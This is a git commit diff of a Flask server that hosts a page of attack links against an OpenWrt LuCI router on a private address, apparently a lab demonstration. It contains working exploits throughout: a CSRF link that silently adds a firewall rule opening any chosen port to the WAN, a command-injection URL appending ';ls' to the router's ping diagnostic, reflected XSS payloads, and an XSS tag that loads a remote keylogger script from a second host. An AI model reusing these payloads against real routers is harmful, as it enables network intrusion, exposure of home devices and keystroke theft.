e525bcca75f6588bdd0f08d728969586c4994858
Nicholas Curran <nicholas.a.curran@gmail.com>
2015-07-27 14:43:25 -0400

    modified:   server.py

--- server.py
+++ server.py
@@ -9,10 +9,10 @@ app.debug=True
 def hello_world():
     return '<br><a href=/csrf/open/80>CSRF:Open Port 80 to the WAN</a></>\
             <br><a href=/reflected_xss>Reflected XSS attack (doesn\'t work in chrome)</a></>\
-            <br><a href=/command_injection_ls>ls via command injection</a></>\
+            <br><a href=/command_injection_ls>Command Injection: ls</a></>\
             <br></>\
             <br>The XSS attack string to call a remote payload should look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/s></script>.</xmp> That points to /s which is the simple alert(1) script. For the keylogger, you should point to <a href=/t>/t</a>, so it would look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/t></script></xmp></>\
-            <br>To check for an IGD use "upnpc -m <iface> -s" and to open port 80 to the WAN use "upnpc -m <iface> -a <ip> <port> <external_port> (TCP|UDP)." For our purposes that\'ll look like: upnpc -m br0 172.30.254.1 80 80 TCP</br>\
+            <br><xmp>To check for an IGD use "upnpc -m <iface> -s" and to open port 80 to the WAN use "upnpc -m <iface> -a <ip> <port> <external_port> (TCP|UDP)." For our purposes that\'ll look like: upnpc -m br0 172.30.254.1 80 80 TCP</xmp></br>\
             '
 
 
@@ -66,17 +66,13 @@ def sxa():
 def csrf_open(port):
     return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport='+port+'&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=tfive&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>Click Me! It\'ll be fun!</a><br></><br>Also, Don\'t forget that you can open any tcp port by going to: <xmp>/csrf/open/<port number></xmp></>'
 
-#@app.route('/csrf100')
-#def csrf2():
-#    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport=100&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=malicious&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>csrf</>'
-
 #
 #Command Injection Stuff
 #
 
 @app.route('/command_injection_ls')
 def cmd_inject():
-    return '<a href=http://172.30.254.1/cgi-bin/luci/admin/network/diag_ping/;ls'
+    return '<a href=http://172.30.254.1/cgi-bin/luci/admin/network/diag_ping/;ls>;ls</>'
 
 #
 #Reflected Cross-Site Scripting Stuff
@@ -84,7 +80,7 @@ def cmd_inject():
 
 @app.route('/reflected_xss')
 def xss():
-    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=whatever/admin/system/packages?query=<script>alert(1)</script>'
+    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=whatever/admin/system/packages?query=\'&lt;script&gt;alert(1)&lt;/script&gt;>Relfected_XSS</>'
 
 if __name__ == '__main__':
     #app.run(port=5000)
